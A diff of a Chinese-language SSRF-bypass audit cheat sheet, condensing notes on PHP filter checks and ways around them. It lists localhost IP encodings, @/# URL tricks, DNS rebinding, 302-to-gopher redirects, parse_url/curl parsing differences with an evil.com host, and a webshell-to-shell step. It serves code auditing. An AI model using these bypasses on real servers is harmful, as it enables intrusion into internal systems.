@@ -1,130 +1,35 @@
 # SSRF 绕过审计
 
-> 代码审计中如何发现和绕过 SSRF 限制
-
----
-
-## 常见过滤与绕过
-
-### 1. 关键字过滤
-
+## 关键字过滤
 ```php
-// 过滤了 127.0.0.1 和 localhost
-$url = $_GET['url'];
-if (preg_match('/127\.0\.0\.1|localhost/i', $url)) {
-    die("blocked");
-}
+preg_match('/127\.0\.0\.1|localhost/i', $url)
 ```
+绕过: `http://0/` `http://[::1]/` `http://2130706433/` `http://0x7f000001/` `http://127.1/` `http://127.0.0.1.xip.io/`
 
-**绕过方式**:
-```
-http://0.0.0.0/              # 部分系统0.0.0.0=127.0.0.1
-http://0/                    # 更简短的 0=127.0.0.1
-http://[::1]/                # IPv6 localhost
-http://2130706433/           # 十进制IP
-http://0x7f000001/           # 十六进制IP
-http://0177.0.0.1/           # 八进制表示
-http://127.1/                # 简写 127.1=127.0.0.1
-http://127.0.1/              # 简写
-http://127.0.0.1.xip.io/     # xip.io 域名解析
-http://127.0.0.1.nip.io/
-```
-
-### 2. URL 开头限制绕过 (@ 绕过)
-
+## @ 绕过（只检查开头）
 ```php
-// 限制必须以特定URL开头
-if(strpos($url, 'http://127.6.6.1/') === 0){
-    file_put_contents($path, file_get_contents($url));
-    echo "console.log($path update successed!)";
-}
+if(strpos($url, 'http://127.6.6.1/') === 0)
 ```
+绕过: `http://127.6.6.1@内网IP:port/`
 
-**绕过方式**:
-```
-http://127.6.6.1@内网IP:端口/        # @前被视为用户名
-http://127.6.6.1.内网IP/             # 部分解析器行为
-http://127.6.6.1#@内网IP/            # fragment 差异
-```
-
-### 3. DNS 解析白名单
-
+## 协议限制
 ```php
-// 只允许特定域名通过
-$host = parse_url($url, PHP_URL_HOST);
-$ip = gethostbyname($host);
-if (!in_array($ip, ['1.2.3.4'])) {
-    die("blocked");
-}
+if (!in_array($scheme, ['http','https']))
+```
+绕过: 302跳转到 gopher://
+
+## 后缀限制
+绕过: 找可回显的图片页 URL 写入木马
+
+## URL 解析差异
+```
+parse_url("http://127.0.0.1:80\@evil.com/") → evil.com
+curl 实际请求 → 127.0.0.1
 ```
 
-**绕过方式**:
+## 审计搜索
 ```
-- DNS Rebinding（DNS重绑定，TTL=0）
-- 302 跳转绕过（控制一个域名跳转到内网）
-- URL 解析差异（parse_url 和 curl 解析不一致）
+file_get_contents($_GET['url'])
+curl_exec($ch)
+fsockopen($host, $port)
 ```
-
-### 4. 协议限制
-
-```php
-// 只允许 http/https
-$scheme = parse_url($url, PHP_URL_SCHEME);
-if (!in_array($scheme, ['http', 'https'])) {
-    die("blocked");
-}
-```
-
-**绕过方式**:
-```
-- 利用 curl 的默认协议
-  在 URL 中省略 scheme → curl 默认当作 http:// 处理
-- 302 跳转绕过
-  在自己的服务器设置 302 跳转到 gopher://gopher://...
-```
-
-### 5. 后缀名限制
-
-```
-场景: 只允许读取 .jpg .png 等后缀的文件
-绕过: 找一个URL -> url/1.jpg 也能正常回显的页面
-      页面内容写入木马后通过 ssrf 尝试拿shell
-```
-
-### 6. URL 解析差异绕过
-
-```php
-// 利用 PHP parse_url 和 curl 解析差异
-$parsed = parse_url($url);
-// parse_url 和 curl 对特殊 URL 的解析方式不同
-```
-
-```
-http://127.0.0.1:80\@evil.com/ → parse_url 解析为 evil.com，curl 访问 127.0.0.1
-http://127.0.0.1:80#@evil.com/ → parse_url 忽略 fragment，curl 可能访问 127.0.0.1
-```
-
----
-
-## 审计关注点
-
-```php
-// 审计时搜索以下模式
-file_get_contents($_GET['url']);
-file_get_contents($_POST['url']);
-curl_exec($ch);
-fsockopen($host, $port);
-```
-
----
-
-## 绕过技巧总结
-
-| 过滤方式 | 绕过方法 |
-|----------|----------|
-| IP 黑名单 | 进制转换、IPv6、简写、DNS重绑定 |
-| 域名白名单 | URL解析差异、302跳转 |
-| 协议限制 | 302跳转、curl默认协议 |
-| 端口限制 | 跳转、DNS重绑定 |
-| 开头限制 | @绕过、#绕过、DNS解析 |
-| 后缀限制 | 找可回显的图片页面 |
